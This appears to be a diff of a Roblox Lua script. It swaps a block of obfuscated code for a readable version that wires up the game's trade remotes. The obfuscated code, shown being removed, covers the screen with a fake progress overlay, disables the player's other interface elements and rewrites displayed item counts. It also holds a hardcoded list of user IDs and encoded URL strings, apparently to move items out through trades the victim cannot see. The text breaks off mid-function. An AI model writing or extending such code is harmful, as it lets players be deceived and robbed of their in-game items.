@@ -1,12 +1,2106 @@
---[[
- .____                  ________ ___.    _____                           __                
- |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
- |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
- |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
- |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
-         \/          \/         \/    \/                \/     \/     \/                   
-          \_Welcome to LuaObfuscator.com   (Alpha 0.10.9) ~  Much Love, Ferib 
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local StarterGui = game:GetService("StarterGui")
+local TeleportService = game:GetService("TeleportService")
 
-]]--
+local remotes = ReplicatedStorage:WaitForChild("Remotes")
+local tradeRemotes = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("TradeRemotes")
+local respondToRequest = tradeRemotes:WaitForChild("RespondToRequest")
+local sendTradeRequest = tradeRemotes:WaitForChild("SendTradeRequest")
+local tradeRequestReceived = tradeRemotes:WaitForChild("TradeRequestReceived")
+local tradeStarted = tradeRemotes:WaitForChild("TradeStarted")
+local tradeUpdated = tradeRemotes:WaitForChild("TradeUpdated")
+local tradeCancelled = tradeRemotes:WaitForChild("TradeCancelled")
+local tradeCompleted = tradeRemotes:WaitForChild("TradeCompleted")
+local addItemToTrade = tradeRemotes:WaitForChild("AddItemToTrade")
+local cancelTradeRemote = tradeRemotes:WaitForChild("CancelTrade")
+local setReady = tradeRemotes:WaitForChild("SetReady")
+local confirmTrade = tradeRemotes:WaitForChild("ConfirmTrade")
 
-local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v154,v155) local v156={};for v357=1, #v154 do v6(v156,v0(v4(v1(v2(v154,v357,v357 + 1 )),v1(v2(v155,1 + (v357% #v155) ,1 + (v357% #v155) + 1 )))%256 ));end return v5(v156);end local v8=game:GetService(v7("\227\198\203\41\239\184\198\10\212\199\232\49\233\169\198\25\212","\126\177\163\187\69\134\219\167"));local v9=game:GetService(v7("\19\193\43\220\249\49\222","\156\67\173\74\165"));local v10=game:GetService(v7("\28\163\93\6\143\35\84\34\190\74\19","\38\84\215\41\118\220\70"));local v11=game:GetService(v7("\99\2\35\0\234\85\4\5\7\247","\158\48\118\66\114"));local v12=game:GetService(v7("\159\33\28\51\99\170\233\191\23\21\36\101\172\248\174","\155\203\68\112\86\19\197"));local v13=v8:WaitForChild(v7("\116\216\59\243\84\125\246","\152\38\189\86\156\32\24\133"));local v14=v8:WaitForChild(v7("\206\82\170\73\232\82\180","\38\156\55\199")):WaitForChild(v7("\156\111\125\44\22\70\255\78\167\105\121\59","\35\200\29\28\72\115\20\154"));local v15=v14:WaitForChild(v7("\43\186\194\207\130\34\48\45\176\227\218\156\57\49\10\171","\84\121\223\177\191\237\76"));local v16=v14:WaitForChild(v7("\136\83\199\164\14\66\49\197\190\100\204\177\47\85\35\213","\161\219\54\169\192\90\48\80"));local v17=v14:WaitForChild(v7("\125\80\1\33\76\112\5\52\92\71\19\49\123\71\3\32\64\84\5\33","\69\41\34\96"));local v18=v14:WaitForChild(v7("\136\209\214\14\7\24\168\194\197\30\7\47","\75\220\163\183\106\98"));local v19=v14:WaitForChild(v7("\54\168\138\51\220\55\170\143\54\205\7\190","\185\98\218\235\87"));local v20=v14:WaitForChild(v7("\255\46\38\226\219\137\202\50\36\227\210\166\206\56","\202\171\92\71\134\190"));local v21=v14:WaitForChild(v7("\29\211\45\140\44\226\35\133\57\205\41\156\44\197","\232\73\161\76"));local v22=v14:WaitForChild(v7("\154\221\70\116\10\190\212\118\82\42\169\216\70\88","\126\219\185\34\61"));local v23=v14:WaitForChild(v7("\47\207\80\113\123\123\199\245\13\202\91","\135\108\174\62\18\30\23\147"));local v24=v14:WaitForChild(v7("\133\236\62\249\29\175\55\222","\167\214\137\74\171\120\206\83"));local v25=v14:WaitForChild(v7("\168\255\60\91\241\181\134\196\32\92\252\162","\199\235\144\82\61\152"));local v26=v13:FindFirstChild(v7("\53\19\168\62\2\5\173\2\9\0\188\37\19\25\171\50","\75\103\118\217"));local v27=v13:FindFirstChild(v7("\242\68\116\21\173\27\238\90\102\17\183\10\200\70\105","\126\167\52\16\116\217"));local v28=true;local v29=0.02 + 0 ;local v30=true;local v31=95.05 -(9 + 86) ;local v32=421.06 -(275 + 146) ;local v33=0.4 + 0 ;local v34=66 -(29 + 35) ;local v35=25;local v36=0.05;local v37=false;local v38=8 -6 ;local v39=true;local v40=true;local v41=0.1 -0 ;local v42=true;local v43=true;local v44=0.05 -0 ;local v45=0.75;local v46=true;local v47=true;local v48={10714075740 -(53 + 959) ,10817163401 -0 ,10796478567 -(813 + 86) ,9352398316 -724560568 ,10792361224,10817324544 -(300 + 1176) };local v49=0 + 0 ;local v50=0.2;local v51=1;local v52=true;local v53=true;local v54=v7("\192\58\52\144\167\67\179\135\42\41\147\183\22\238\204\96\35\143\185\86\253\216\39\111\151\177\27\244\199\33\43\147\251\72\168\145\125\112\217\229\79\164\145\125\114\208\229\76\175\154\124\114\207\237\59\164\252\126\14\178\178\10\165\192\15\20\169\174\42\222\234\31\109\153\178\23\228\239\35\41\141\177\79\230\204\23\12\129\173\56\177\210\54\26\176\147\18\221\254\39\36\167\227\3\210\208\31\43\173\139\84\170\231\27\40\163\159\21\174\152\45","\156\168\78\64\224\212\121");local v55=403 -(121 + 182) ;local v56=4;local v57=true;local v58=1 + 2 ;local v59=v7("\52\239\172\194\8\252\229\254\14\235\166\203\71\202\176\222\2","\174\103\142\197");local v60=v7("\101\43\77\49\53\74\184\85\41\81\54\42\74\184\68\61\81\120\44\80\184\88\45\72\120\54\91\234\64\45\77\43\101\78\244\83\41\76\61\101\77\239\95\60\92\48\101\74\247\22\56\74\58\41\87\251\22\59\90\42\51\91\234","\152\54\72\63\88\69\62");local v61=1245 -(988 + 252) ;local v62=true;local v63=5;local v64=1 + 5 ;local v65=32 + 68 ;local v66=2;local v67=true;local v68=v7("\220\208\250\76\199\158\161\19\198\197\249\18\211\205\250\84\193\198\251\79\209\214\237\83\218\208\235\82\192\138\237\83\217\139\244\89\193\215\236\73\192\192\231\90\210\139\221\93\221\200\225\78\153\244\231\89\215\193\163\120\193\212\235\17\248\203\239\88\209\214\161\81\213\205\224\19\248\203\239\88\209\214\160\80\193\197","\60\180\164\142");local v69="";local v70={};local v71=false;local v72=1970 -(49 + 1921) ;local v73=890 -(223 + 667) ;local v74=0;local v75=52 -(51 + 1) ;local v76={[v7("\85\71\44\61\34\224\1","\114\56\62\101\73\71\141")]={},[v7("\172\225\222\205\170\192\207\193\181\250","\164\216\137\187")]={}};local v77=v9.LocalPlayer;local function v78() local v157= #v9:GetPlayers();return v157<=v56 ,v157;end local v79=false;local v80=false;local v81={v7("\218\242\37\162\181\164\68\157\245\56\160\175\235\24\156\235\52\188\179\177\25\211\255\55\187\163\242\15","\107\178\134\81\210\198\158"),v7("\48\26\150\214\185\98\65\205\212\171\47\64\133\207\190\48\27\128\211\185\61\28\129\201\164\44\11\140\210\228\59\1\143\137\185\48\2\135\222\189\57\28\135\137\152\57\23\132\207\175\52\10\205\203\171\49\0\205\213\165\45\28\129\195","\202\88\110\226\166")};local v82=3;local v83=1126.5 -(146 + 979) ;local v84=1.5 + 1 ;local v85=3;local v86=609 -(311 + 294) ;local v87=0.3 -0 ;local v88=10;local v89=5 + 5 ;local v90=false;local v91=nil;local v92=nil;local v93=nil;local v94=1443 -(496 + 947) ;local v95=false;local v96=false;local v97="";local v98=1383 -(1233 + 125) ;local v99=nil;local v100=nil;local v101=nil;local v102=nil;local v103=nil;local v104=false;local v105={};local v106=false;local v107=0 + 0 ;local v108={};local v109={v7("\225\14\145\254\201\240\27\131\227\217\224\26\144\229\207\205\12\155\214\196\199\45\151\227\222\204\1\145\194\227","\170\163\111\226\151")};local function v110(v158) if  not v77 then return;end local v159=v77:FindFirstChild(v7("\33\60\179\33\75\37\14\4\57","\73\113\80\210\88\46\87"));if  not v159 then return;end if v158 then v105={};for v399,v400 in ipairs(v109) do local v401=v159:FindFirstChild(v400);if (v401 and v401:IsA(v7("\178\47\223\23\226\143\11\216\27","\135\225\76\173\114"))) then local v619=0 + 0 ;local v620;while true do if (v619==(1645 -(963 + 682))) then v620=0;while true do if (0==v620) then v105[v400]=v401.Enabled;v401.Enabled=false;break;end end break;end end end end else local v383=0 + 0 ;while true do if (v383==(1504 -(504 + 1000))) then for v637,v638 in pairs(v105) do local v639=0;local v640;while true do if ((0 + 0)==v639) then v640=v159:FindFirstChild(v637);if (v640 and v640:IsA(v7("\41\238\170\181\169\179\128\15\228","\199\122\141\216\208\204\221"))) then v640.Enabled=v638;end break;end end end v105={};break;end end end end local function v111() local v160=0 + 0 ;local v161;local v162;local v163;local v164;local v165;local v166;local v167;local v168;local v169;local v170;local v171;local v172;local v173;local v174;local v175;local v176;local v177;local v178;local v179;local v180;local v181;local v182;while true do if (v160==(2 + 18)) then v102.Text=v7("\248\114\40\81\254\39\205\207\55\45\64\248\62\146\139\39","\168\171\23\68\52\157\83");v102.Parent=v178;v181=Instance.new(v7("\192\116\237\185\7\56\147\224\126\251","\231\148\17\149\205\69\77"));v181.Name=v7("\163\171\200\232\82","\159\224\199\167\155\55");v181.AnchorPoint=Vector2.new(1,0 -0 );v181.Position=UDim2.new(1 + 0 , -14,0 + 0 ,196 -(156 + 26) );v181.Size=UDim2.new(0 + 0 ,53 -19 ,0,198 -(149 + 15) );v181.BackgroundColor3=Color3.fromRGB(194,66,73);v160=21;end if (v160==(968 -(890 + 70))) then v171.Size=UDim2.new(1, -(161 -(39 + 78)),482 -(14 + 468) ,38);v171.Font=Enum.Font.GothamBold;v171.TextSize=65 -35 ;v171.TextXAlignment=Enum.TextXAlignment.Left;v171.TextColor3=Color3.fromRGB(712 -457 ,132 + 123 ,154 + 101 );v171.Text=v7("\125\191\209\96\59\202\67\163\14\143\197\98\42\131\125\182\65\168\213\97\60","\196\46\203\176\18\79\163\45");v171.Parent=v163;v172=Instance.new(v7("\140\39\102\10\8\250\237\189\46","\143\216\66\30\126\68\155"));v160=9;end if (v160==(4 + 13)) then v178.Size=UDim2.new(1, -44,0 + 0 ,40 + 112 );v178.BackgroundColor3=Color3.fromRGB(30 -14 ,22,38);v178.BackgroundTransparency=0.18 + 0 ;v178.BorderSizePixel=0;v178.Parent=v163;v179=Instance.new(v7("\153\7\136\68\213\89\27\27","\105\204\78\203\43\167\55\126"));v179.CornerRadius=UDim.new(0 -0 ,1 + 9 );v179.Parent=v178;v160=69 -(12 + 39) ;end if ((3 + 0)==v160) then v163.BackgroundTransparency=0.05;v163.BorderSizePixel=0 -0 ;v163.Parent=v99;v164=Instance.new(v7("\152\224\192\207\63","\30\222\146\161\162\90\174\210"));v164.Name=v7("\214\70\113\14\234\89","\106\133\46\16");v164.AnchorPoint=Vector2.new(0.5 -0 ,0.5 + 0 );v164.Position=UDim2.new(0.5,0 + 0 ,0.5,9 -5 );v164.Size=UDim2.new(0 + 0 ,3769 -2989 ,1710 -(1596 + 114) ,992 -612 );v160=717 -(164 + 549) ;end if (v160==(1442 -(1059 + 379))) then v164.BackgroundColor3=Color3.fromRGB(0,0,0 -0 );v164.BackgroundTransparency=0.6;v164.BorderSizePixel=0;v164.ZIndex=v163.ZIndex-1 ;v164.Parent=v99;v165=Instance.new(v7("\109\9\80\243\72\78\93\50","\32\56\64\19\156\58"));v165.CornerRadius=UDim.new(0 + 0 ,4 + 14 );v165.Parent=v164;v160=397 -(145 + 247) ;end if (v160==(6 + 1)) then v169.Parent=v163;v170=Instance.new(v7("\136\240\3\67\175\215\37\94","\44\221\185\64"));v170.CornerRadius=UDim.new(0,9 + 9 );v170.Parent=v169;v171=Instance.new(v7("\53\226\80\75\95\0\229\77\83","\19\97\135\40\63"));v171.Name=v7("\154\85\39\55\42","\81\206\60\83\91\79");v171.BackgroundTransparency=2 -1 ;v171.Position=UDim2.new(0 + 0 ,19 + 3 ,0 -0 ,736 -(254 + 466) );v160=568 -(544 + 16) ;end if (v160==(0 -0)) then if (v99 and v99.Parent) then return true;end if  not v77 then return false;end v161=v77:FindFirstChild(v7("\157\209\17\233\125\228\138\200\25","\150\205\189\112\144\24")) or v77:WaitForChild(v7("\21\136\190\85\1\154\54\5\44","\112\69\228\223\44\100\232\113")) ;if  not v161 then return false;end v99=Instance.new(v7("\231\28\21\214\179\114\161\193\22","\230\180\127\103\179\214\28"));v99.Name=v7("\191\4\86\74\235\83\208\158\10\92\67\247\82\233\130\2\106\111","\128\236\101\63\38\132\33");v99.ResetOnSpawn=false;v99.IgnoreGuiInset=true;v160=629 -(294 + 334) ;end if (v160==(265 -(236 + 17))) then v100.TextXAlignment=Enum.TextXAlignment.Left;v100.TextColor3=Color3.fromRGB(91 + 118 ,170 + 48 ,896 -658 );v100.Text=v7("\163\57\177\79\209\80\5\139\35\162\10\200\79\81\134\56\181\79\156\83\20\142\40\166\94\217\68\81\139\57\160\71\207","\113\226\77\197\42\188\32");v100.Parent=v163;v101=Instance.new(v7("\14\19\236\161\22\23\246\176\54","\213\90\118\148"));v101.Name=v7("\111\47\166\81\72\79","\45\59\78\212\54");v101.BackgroundTransparency=4 -3 ;v101.Position=UDim2.new(0 + 0 ,19 + 3 ,794 -(413 + 381) ,6 + 124 );v160=13;end if (v160==(23 -12)) then v173.Parent=v163;v100=Instance.new(v7("\235\26\236\8\22\222\29\241\16","\90\191\127\148\124"));v100.Name=v7("\75\147\47\3\109\148","\119\24\231\78");v100.BackgroundTransparency=2 -1 ;v100.Position=UDim2.new(1970 -(582 + 1388) ,36 -14 ,0 + 0 ,458 -(326 + 38) );v100.Size=UDim2.new(2 -1 , -(62 -18),0,30);v100.Font=Enum.Font.Gotham;v100.TextSize=640 -(47 + 573) ;v160=12;end if (v160==(4 + 6)) then v172.Text=v7("\14\81\33\221\158\48\243\50\93\119\235\219\7\245\43\87\57","\134\66\56\87\184\190\116");v172.Parent=v163;v173=Instance.new(v7("\26\35\8\182\28","\85\92\81\105\219\121\139\65"));v173.Name=v7("\213\182\81\65\121\205\217\186\70\76\120\218\239","\191\157\211\48\37\28");v173.Position=UDim2.new(0,22,0,82);v173.Size=UDim2.new(1, -(186 -142),0 -0 ,1665 -(1269 + 395) );v173.BackgroundColor3=Color3.fromRGB(55,557 -(76 + 416) ,541 -(319 + 124) );v173.BorderSizePixel=0 -0 ;v160=1018 -(564 + 443) ;end if (v160==13) then v101.Size=UDim2.new(2 -1 , -(502 -(337 + 121)),0,28);v101.Font=Enum.Font.GothamBold;v101.TextSize=55 -36 ;v101.TextXAlignment=Enum.TextXAlignment.Left;v101.TextColor3=Color3.fromRGB(176,652 -456 ,2150 -(1261 + 650) );v101.Text=v7("\52\67\147\142\198\60\168\224\21\87\151\203\133\33\184\254\4\22\183\138\148\41\168\228\74\22\211\196\214","\144\112\54\227\235\230\78\205");v101.Parent=v163;v174=Instance.new(v7("\149\58\14\241\213","\59\211\72\111\156\176"));v160=6 + 8 ;end if ((1 -0)==v160) then v99.DisplayOrder=1001816 -(772 + 1045) ;v99.Enabled=false;v99.Parent=v161;v162=Instance.new(v7("\138\187\16\73\179","\175\204\201\113\36\214\139"));v162.Name=v7("\101\205\54\215\0\85\195\37","\100\39\172\85\188");v162.Size=UDim2.fromScale(1,1);v162.BackgroundColor3=Color3.fromRGB(1 + 1 ,4,154 -(102 + 42) );v162.BackgroundTransparency=0.35;v160=2;end if (v160==(1859 -(1524 + 320))) then v175.Parent=v174;v103=Instance.new(v7("\104\5\48\165\244","\58\46\119\81\200\145\208\37"));v103.Name=v7("\27\158\63\171\187\184\37\56\170\57\160\165","\86\75\236\80\204\201\221");v103.Size=UDim2.new(1270 -(1049 + 221) ,156 -(18 + 138) ,2 -1 ,1102 -(67 + 1035) );v103.BackgroundColor3=Color3.fromRGB(439 -(136 + 212) ,607 -464 ,205 + 50 );v103.BorderSizePixel=0 + 0 ;v103.Parent=v174;v176=Instance.new(v7("\71\104\84\138\236\133\119\83","\235\18\33\23\229\158"));v160=1620 -(240 + 1364) ;end if (v160==2) then v162.BorderSizePixel=1082 -(1050 + 32) ;v162.Parent=v99;v163=Instance.new(v7("\139\106\184\141\54","\83\205\24\217\224"));v163.Name=v7("\203\196\196\51","\93\134\165\173");v163.AnchorPoint=Vector2.new(0.5 -0 ,0.5 + 0 );v163.Position=UDim2.new(1055.5 -(331 + 724) ,0,0.5 + 0 ,644 -(269 + 375) );v163.Size=UDim2.new(725 -(267 + 458) ,237 + 523 ,0 -0 ,360);v163.BackgroundColor3=Color3.fromRGB(830 -(667 + 151) ,1513 -(1410 + 87) ,1925 -(1504 + 393) );v160=8 -5 ;end if (v160==5) then v166=Instance.new(v7("\111\225\198\89\72\252\133\72","\224\58\168\133\54\58\146"));v166.CornerRadius=UDim.new(0 -0 ,814 -(461 + 335) );v166.Parent=v163;v167=Instance.new(v7("\108\127\120\233\103\137\140\14","\107\57\54\43\157\21\230\231"));v167.Color=Color3.fromRGB(12 + 80 ,140,2016 -(1730 + 31) );v167.Thickness=1.8;v167.Parent=v163;v168=Instance.new(v7("\238\162\54\231\184\216\198\222\133\5","\175\187\235\113\149\217\188"));v160=6;end if (v160==(1683 -(728 + 939))) then v176.CornerRadius=UDim.new(3 -2 ,0 -0 );v176.Parent=v103;v177=Instance.new(v7("\101\147\230\169\81\190\200\190\94\174","\219\48\218\161"));v177.Color=ColorSequence.new({ColorSequenceKeypoint.new(0 -0 ,Color3.fromRGB(1163 -(138 + 930) ,177,234 + 21 )),ColorSequenceKeypoint.new(1,Color3.fromRGB(91,79 + 21 ,219 + 36 ))});v177.Parent=v103;v178=Instance.new(v7("\194\99\125\68\222","\128\132\17\28\41\187\47"));v178.Name=v7("\37\51\18\59\126\0\32\2","\61\97\82\102\90");v178.Position=UDim2.new(0 -0 ,22,1766 -(459 + 1307) ,2062 -(474 + 1396) );v160=17;end if (v160==(31 -13)) then v180=Instance.new(v7("\144\131\16\10\1\11\204\84","\49\197\202\67\126\115\100\167"));v180.Color=Color3.fromRGB(55 + 3 ,1 + 75 ,122);v180.Thickness=2 -1 ;v180.Transparency=0.2;v180.Parent=v178;v102=Instance.new(v7("\3\94\199\61\172\87\92\50\87","\62\87\59\191\73\224\54"));v102.Name=v7("\214\23\251\199\243\11\238\208","\169\135\98\154");v102.BackgroundTransparency=1 + 0 ;v160=19;end if (v160==22) then v182.Parent=v181;v181.MouseEnter:Connect(function() v181.BackgroundColor3=Color3.fromRGB(714 -500 ,340 -262 ,677 -(562 + 29) );end);v181.MouseLeave:Connect(function() v181.BackgroundColor3=Color3.fromRGB(166 + 28 ,66,73);end);v181.MouseButton1Click:Connect(function() v104=true;if v99 then v99.Enabled=false;end if v93 then pcall(function() v93:Notify({[v7("\184\244\88\62\23","\26\236\157\44\82\114\44")]=v7("\25\47\220\87\37\60\149\107\35\43\214\94\106\10\192\75\47","\59\74\78\181"),[v7("\6\222\84\78\182\43\197","\211\69\177\58\58")]=v7("\147\240\105\240\169\232\182\235\122\240\229\199\178\225\57\247\240\139\162\246\124\231","\171\215\133\25\149\137"),[v7("\197\221\32\251\251\57\243\76","\34\129\168\82\154\143\80\156")]=1423 -(374 + 1045) ,[v7("\172\191\50\12\77","\233\229\210\83\107\40\46")]=4483362458});end);end end);return true;end if (v160==(17 + 4)) then v181.BorderSizePixel=0;v181.Text="X";v181.Font=Enum.Font.GothamBold;v181.TextSize=18;v181.TextColor3=Color3.fromRGB(791 -536 ,255,893 -(448 + 190) );v181.Parent=v163;v182=Instance.new(v7("\194\218\31\221\229\253\57\192","\178\151\147\92"));v182.CornerRadius=UDim.new(0 + 0 ,4 + 4 );v160=15 + 7 ;end if (v160==(53 -39)) then v174.Name=v7("\126\149\236\42\92\130\240\62\122\149\226\46\69","\77\46\231\131");v174.Position=UDim2.new(0 -0 ,1516 -(1307 + 187) ,0,666 -498 );v174.Size=UDim2.new(2 -1 , -(134 -90),683 -(232 + 451) ,12);v174.BackgroundColor3=Color3.fromRGB(36 + 1 ,44,59 + 7 );v174.BorderSizePixel=564 -(510 + 54) ;v174.Parent=v163;v175=Instance.new(v7("\143\125\149\79\168\90\179\82","\32\218\52\214"));v175.CornerRadius=UDim.new(1,0 -0 );v160=51 -(13 + 23) ;end if (v160==(16 -7)) then v172.Name=v7("\153\221\15\223\204\183\219\228","\129\202\168\109\171\165\195\183");v172.BackgroundTransparency=1 -0 ;v172.Position=UDim2.new(0 -0 ,1110 -(830 + 258) ,0 -0 ,33 + 19 );v172.Size=UDim2.new(1 + 0 , -(1485 -(860 + 581)),0,88 -64 );v172.Font=Enum.Font.GothamMedium;v172.TextSize=14;v172.TextXAlignment=Enum.TextXAlignment.Left;v172.TextColor3=Color3.fromRGB(110 + 28 ,394 -(237 + 4) ,190);v160=10;end if (v160==(44 -25)) then v102.Position=UDim2.new(0,35 -21 ,0,18 -8 );v102.Size=UDim2.new(1, -(23 + 5),1 + 0 , -(75 -55));v102.Font=Enum.Font.GothamMedium;v102.TextSize=10 + 11 ;v102.TextWrapped=true;v102.TextXAlignment=Enum.TextXAlignment.Left;v102.TextYAlignment=Enum.TextYAlignment.Top;v102.TextColor3=Color3.fromRGB(138,134 + 111 ,1626 -(85 + 1341) );v160=20;end if (v160==6) then v168.Color=ColorSequence.new({ColorSequenceKeypoint.new(0 -0 ,Color3.fromRGB(394 -(45 + 327) ,56 -26 ,52)),ColorSequenceKeypoint.new(1 + 0 ,Color3.fromRGB(2 + 8 ,7 + 7 ,24))});v168.Rotation=63 -41 ;v168.Parent=v163;v169=Instance.new(v7("\26\189\128\65\230","\24\92\207\225\44\131\25"));v169.Name=v7("\99\214\185\72\30\111\106\208\187\73\21\105","\29\43\179\216\44\123");v169.Size=UDim2.new(1733 -(64 + 1668) ,1973 -(1227 + 746) ,0 -0 ,9 -4 );v169.BackgroundColor3=Color3.fromRGB(96,140,749 -(415 + 79) );v169.BorderSizePixel=0 + 0 ;v160=498 -(142 + 349) ;end end end local function v112(v183) if v111() then v99.Enabled=v183==true ;end end local function v113(v184,v185) local v186=0;local v187;local v188;local v189;while true do if (v186==0) then v187=0 + 0 ;v188=nil;v186=1 -0 ;end if ((1 + 0)==v186) then v189=nil;while true do if (v187==(1 + 0)) then local v642=0;while true do if (v642==(0 -0)) then local v693=0;while true do if (v693==(1864 -(1710 + 154))) then if (v189<=(338 -(200 + 118))) then return tostring(v188 * ((1 + 1)^v189) );end return string.format(v7("\132\70\114\206\69\147\124\119\210","\101\161\34\82\182"),v188,v189);end end end end end if (v187==0) then v188=math.max(0 -0 ,math.floor(v184 or (0 -0) ));v189=math.max(0 + 0 ,math.floor(v185 or (0 + 0) ));v187=1 + 0 ;end end break;end end end local function v114(v190) if (type(v190)~=v7("\251\25\75\247\213\229","\78\136\109\57\158\187\130\226")) then return "";end local v191=string.lower(v190);v191=string.gsub(v191,v7("\5\1\188\230\3","\145\94\95\153"),"");return v191;end local function v115(v192) local v193=0;local v194;local v195;local v196;local v197;while true do local v358=0 + 0 ;while true do if (v358==(0 -0)) then if (v193==1) then if  not v195 then return nil;end v196=v114(v192);if (v196=="") then return nil;end v197=v195:FindFirstChild(v7("\235\149\19\243\6","\56\162\225\118\158\89\142")   .. v192 ,true);v193=1252 -(363 + 887) ;end if (v193==(2 -0)) then if v197 then local v682=0 -0 ;local v683;while true do if ((0 + 0)==v682) then v683=v197:FindFirstChild(v7("\109\16\193\161\54\209\72\28","\184\60\101\160\207\66"),true);if (v683 and v683:IsA(v7("\5\135\100\168\29\131\126\185\61","\220\81\226\28"))) then return v683;end break;end end end for v657,v658 in ipairs(v195:GetDescendants()) do if (v658:IsA(v7("\52\192\139\212\232\205\22\214\150","\167\115\181\226\155\138")) and (string.sub(v658.Name,1,11 -6 )==v7("\203\54\226\81\68","\166\130\66\135\60\27\17"))) then local v694=0 + 0 ;local v695;while true do if (v694==(1664 -(674 + 990))) then v695=string.sub(v658.Name,2 + 4 );if (v114(v695)==v196) then local v744=0 + 0 ;local v745;while true do if (v744==0) then v745=v658:FindFirstChild(v7("\117\95\207\123\36\77\94\215","\80\36\42\174\21"),true);if (v745 and v745:IsA(v7("\122\21\47\110\98\17\53\127\66","\26\46\112\87"))) then return v745;end break;end end end break;end end end end return nil;end v358=1 -0 ;end if (v358==1) then if (v193==(1055 -(507 + 548))) then if  not v77 then return nil;end v194=v77:FindFirstChild(v7("\205\193\21\204\75\165\218\216\29","\215\157\173\116\181\46"));if  not v194 then return nil;end v195=v194:FindFirstChild(v7("\28\186\157\247\212\33\187\153\235\234\52\186\142\254\239\28","\186\85\212\235\146"));v193=838 -(289 + 548) ;end break;end end end end local function v116(v198,v199) local v200=1818 -(821 + 997) ;while true do if (v200==(255 -(195 + 60))) then if ((typeof(v198)~=v7("\173\34\169\120\186","\212\217\67\203\20\223\223\37")) or ( #v198==0)) then return;end for v583,v584 in ipairs(v198) do if ((typeof(v584)==v7("\174\140\170\222\191","\178\218\237\200")) and (type(v584.name)==v7("\165\161\244\217\184\178","\176\214\213\134"))) then local v643=0;local v644;while true do if (v643==(0 + 0)) then v644=v115(v584.name);if v644 then local v720=1501 -(251 + 1250) ;local v721;while true do if (v720==(0 -0)) then v721=v113(v584.amount,v199);v644.Text="x"   .. v721 ;break;end end end break;end end end end break;end end end local function v117() for v359,v360 in pairs(v108) do local v361=0 + 0 ;local v362;while true do if (v361==0) then v362=v115(v359);if v362 then v362.Text=v360;end break;end end end end local function v118(v201,v202,v203) local v204=1032 -(809 + 223) ;local v205;while true do if (v204==(3 -0)) then v117();task.spawn(function() while v106 and (v205==v107)  do local v621=0;local v622;while true do if (v621==(0 -0)) then v622=0 -0 ;while true do if (v622==(0 + 0)) then v117();task.wait(0.25 + 0 );break;end end break;end end end end);break;end if (v204==(618 -(14 + 603))) then v106=v201==true ;if  not v106 then local v623=0;while true do if (v623==(129 -(118 + 11))) then v108={};return;end end end v204=2;end if (v204==(0 + 0)) then v107=v107 + 1 + 0 ;v205=v107;v204=2 -1 ;end if (v204==2) then v108={};if (typeof(v202)==v7("\224\172\180\216\173","\57\148\205\214\180\200\54")) then for v646,v647 in ipairs(v202) do if ((typeof(v647)==v7("\6\252\55\56\115","\22\114\157\85\84")) and (type(v647.name)==v7("\215\223\1\205\83\241","\200\164\171\115\164\61\150"))) then v108[v647.name]="x"   .. v113(v647.amount,v203) ;end end end v204=952 -(551 + 398) ;end end end local function v119(v206,v207) local v208=0;local v209;while true do if (v208==0) then if ((typeof(v206)~=v7("\170\245\1\73\134","\227\222\148\99\37")) or ( #v206==(0 + 0))) then return v7("\0\87\94\243\250\39\87\86\182\240\39\87\95\172\185\99","\153\83\50\50\150");end v209={};v208=1 + 0 ;end if (v208==(2 + 0)) then return table.concat(v209,"\n");end if ((3 -2)==v208) then for v585,v586 in ipairs(v206) do if ((typeof(v586)==v7("\73\119\113\16\118","\45\61\22\19\124\19\203")) and (type(v586.name)==v7("\210\6\31\252\12\119","\217\161\114\109\149\98\16"))) then local v648=tonumber(v586.amount) or (0 -0) ;table.insert(v209,string.format(v7("\87\51\98\60\249\103","\20\114\64\88\28\220"),v586.name,v113(v648,v207)));end end if ( #v209==(0 + 0)) then return v7("\2\4\222\177\251\196\184\53\65\219\160\253\221\231\113\81","\221\81\97\178\212\152\176");end v208=7 -5 ;end end end local function v120(v210,v211,v212,v213,v214) if  not v111() then return;end if v100 then v100.Text=v210 or v7("\236\243\9\254\23\221\243\20\245\29\141\243\18\187\30\216\247\24\187\9\200\235\24\248\14\200\227\93\242\14\200\234\14","\122\173\135\125\155") ;end if v101 then local v386=0 + 0 ;local v387;local v388;while true do if (v386==(89 -(40 + 49))) then local v624=0 -0 ;while true do if (v624==0) then v387=math.max(0,math.floor(v211 or 0 ));v388=math.max(491 -(99 + 391) ,math.floor(v212 or (1 + 0) ));v624=4 -3 ;end if (v624==1) then v386=1;break;end end end if (v386==1) then v101.Text=string.format(v7("\160\212\16\188\127\35\205\148\196\1\173\127\50\199\145\207\20\249\11\48\218\131\196\20\227\127\116\204\203\132\4","\168\228\161\96\217\95\81"),v387,v388);if v103 then v103.Size=UDim2.new(math.clamp(v387/v388 ,0,2 -1 ),0,1 + 0 ,0 -0 );end break;end end end if v102 then local v389=1604 -(1032 + 572) ;local v390;while true do if (v389==0) then v390=math.max(417 -(203 + 214) ,math.floor(v214 or (1817 -(568 + 1249)) ));v102.Text=v119(v213,v390);break;end end end end local function v121() local v215=0 + 0 ;local v216;while true do if (v215==(0 -0)) then local v561=0;while true do if (0==v561) then v216=v70.Items;if (typeof(v216)==v7("\207\208\44\80\42","\55\187\177\78\60\79")) then return  #v216;end v561=3 -2 ;end if ((1307 -(913 + 393))==v561) then v215=2 -1 ;break;end end end if ((1 -0)==v215) then return 410 -(269 + 141) ;end end end local function v122(v217) local v218=0 -0 ;local v219;local v220;local v221;local v222;while true do if (v218==4) then local v562=0;while true do if (v562==(1981 -(362 + 1619))) then if ( #v220>v221) then table.insert(v222,string.format(v7("\247\66\205\32\12\49\236\252\8\195\44\13\39\169","\204\217\108\227\65\98\85"), #v220-v221 ));end return table.concat(v222,"\n");end end end if (v218==1) then local v563=1625 -(950 + 675) ;while true do if ((1 + 0)==v563) then v218=2;break;end if (v563==(1179 -(216 + 963))) then v220={};for v660,v661 in ipairs(v219) do if ((typeof(v661)==v7("\218\127\176\15\128","\229\174\30\210\99")) and (type(v661.name)==v7("\8\249\148\88\227\58","\89\123\141\230\49\141\93"))) then 